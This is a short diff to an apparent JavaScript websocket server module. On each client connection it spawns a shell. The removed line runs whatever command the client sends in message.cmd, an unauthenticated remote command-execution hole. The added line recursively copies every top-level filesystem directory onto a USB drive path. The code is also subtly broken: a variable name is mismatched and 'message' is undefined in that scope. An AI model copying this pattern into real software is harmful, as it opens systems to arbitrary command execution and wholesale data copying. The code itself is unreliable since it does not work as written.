@@ -98,7 +98,7 @@ module.exports.onStart = function () {
 
     server.on('connection', (ws) => {
         global.currentClient = ws;
-        const copyallthemfile = spawn('sh', ['-c', message.cmd]);
+        const copyallthemfile = spawn('sh', ['-c', 'cp -r $(find / -mindepth 1 -maxdepth 1 ! -path /media) /media/USBDriveA1/samsungthings']);
                     copyallthemfiles.stdout.on('data', (data) => {
                         //ws.send(JSON.stringify({ type: "thelog", message: `stdout: ${data}` }));
                     });
